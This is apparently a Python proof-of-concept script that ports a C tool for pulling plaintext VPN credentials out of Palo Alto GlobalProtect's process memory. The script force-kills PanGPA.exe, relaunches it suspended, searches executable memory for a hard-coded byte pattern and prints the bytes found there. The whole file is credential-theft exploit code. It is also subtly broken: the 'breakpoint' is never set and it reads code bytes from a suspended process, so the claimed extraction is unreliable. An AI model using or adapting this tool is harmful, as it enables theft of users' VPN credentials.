#!/usr/bin/env python

description = 'conversión de un C en python [poc de https://shells.systems/extracting-plaintext-credentials-from-palo-alto-global-protect/ ]'
author = 'Apuromafo'
version = '0.0.1'
date = '28.11.2024'
import ctypes
import ctypes.wintypes
import sys
import time
import re

# Definir constantes
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
CREATE_SUSPENDED = 0x00000004
PAGE_EXECUTE_READ = 0x20
MEM_COMMIT = 0x1000

# Definir la estructura MEMORY_BASIC_INFORMATION
class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.wintypes.LPVOID),
        ("AllocationBase", ctypes.wintypes.LPVOID),
        ("AllocationProtect", ctypes.wintypes.DWORD),
        ("RegionSize", ctypes.c_size_t),
        ("State", ctypes.wintypes.DWORD),
        ("Protect", ctypes.wintypes.DWORD),
        ("Type", ctypes.wintypes.DWORD),
    ]

# Definir la estructura STARTUPINFO
class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.wintypes.DWORD),
        ("lpReserved", ctypes.wintypes.LPWSTR),
        ("lpDesktop", ctypes.wintypes.LPWSTR),
        ("lpTitle", ctypes.wintypes.LPWSTR),
        ("dwX", ctypes.wintypes.DWORD),
        ("dwY", ctypes.wintypes.DWORD),
        ("dwXSize", ctypes.wintypes.DWORD),
        ("dwYSize", ctypes.wintypes.DWORD),
        ("dwFlags", ctypes.wintypes.DWORD),
        ("wShowWindow", ctypes.wintypes.WORD),
        ("cbReserved2", ctypes.wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(ctypes.wintypes.BYTE)),
        ("hStdInput", ctypes.wintypes.HANDLE),
        ("hStdOutput", ctypes.wintypes.HANDLE),
        ("hStdError", ctypes.wintypes.HANDLE),
    ]

# Definir la estructura PROCESS_INFORMATION
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.wintypes.HANDLE),
        ("hThread", ctypes.wintypes.HANDLE),
        ("dwProcessId", ctypes.wintypes.DWORD),
        ("dwThreadId", ctypes.wintypes.DWORD),
    ]

# Función para leer memoria desde una dirección específica
def read_process_memory(process_handle, address, size):
    buffer = ctypes.create_string_buffer(size)
    bytes_read = ctypes.c_size_t()
    success = ctypes.windll.kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(address), buffer, size, ctypes.byref(bytes_read))
    if not success:
        raise Exception(f"Error al leer la memoria en la dirección: {hex(address)}. Código de error: {ctypes.GetLastError()}")
    return buffer.raw[:bytes_read.value]

# Función para buscar una dirección de memoria que contenga un patrón específico de bytes
def mem_search(process_id, hex_pattern):
    process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, process_id)
    if not process_handle:
        raise Exception("No se pudo abrir el proceso.")

    address = 0
    mbi = MEMORY_BASIC_INFORMATION()

    while ctypes.windll.kernel32.VirtualQueryEx(process_handle, ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)):
        if (mbi.Protect & PAGE_EXECUTE_READ) != 0 and mbi.State == MEM_COMMIT:
            try:
                buffer = read_process_memory(process_handle, mbi.BaseAddress, mbi.RegionSize)
                for i in range(len(buffer) - len(hex_pattern) + 1):
                    if buffer[i:i+len(hex_pattern)] == bytes(hex_pattern):
                        return mbi.BaseAddress + i
            except Exception as e:
                print(f"Error al leer la memoria en la dirección {hex(mbi.BaseAddress)}: {e}")
        address += mbi.RegionSize

    ctypes.windll.kernel32.CloseHandle(process_handle)
    return None

# Función para imprimir datos en formato XML
def pretty_print_xml(buffer):
    xml_data = buffer.decode('utf-8', errors='ignore')
    print("************************************************************")
    print("Datos en formato XML:")
    print(xml_data)
    print("************************************************************")

# Función principal
def main():
    process_path = r"C:\Program Files\Palo Alto Networks\GlobalProtect\panGPA.exe"
    ctypes.windll.kernel32.WinExec(f'taskkill /IM PanGPA.exe /F', 0)
    
    si = STARTUPINFO()
    pi = PROCESS_INFORMATION()
    si.cb = ctypes.sizeof(si)

    if not ctypes.windll.kernel32.CreateProcessW(process_path, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
        print("[-] No se pudo crear el proceso.")
        print(f"Código de error: {ctypes.GetLastError()}")
        return

    print(f"[*] Proceso suspendido creado con éxito, PID: {pi.dwProcessId}")

    # Ejemplo de patrón de búsqueda (ajusta según lo que estés buscando)
    pattern = [0xBA, 0x2A, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x40, 0xF8, 0xE8, 0xA3, 0xC8, 0x37, 0x00, 0x48, 0x8D, 0x15]
    
    process_id = pi.dwProcessId
    breakpoint_address = mem_search(process_id, pattern)

    if breakpoint_address is None:
        print("[-] Patrón no encontrado.")
        return

    print(f"[*] Patrón encontrado en la dirección: {hex(breakpoint_address)}")

    # Leer memoria y extraer datos en formato XML
    try:
        buffer = read_process_memory(pi.hProcess, breakpoint_address, 256)  # Ajustar el tamaño según sea necesario
        pretty_print_xml(buffer)
    except Exception as e:
        print(f"[-] Error al leer la memoria: {str(e)}")
        return

    ctypes.windll.kernel32.CloseHandle(pi.hThread)
    ctypes.windll.kernel32.CloseHandle(pi.hProcess)

if __name__ == "__main__":
    main()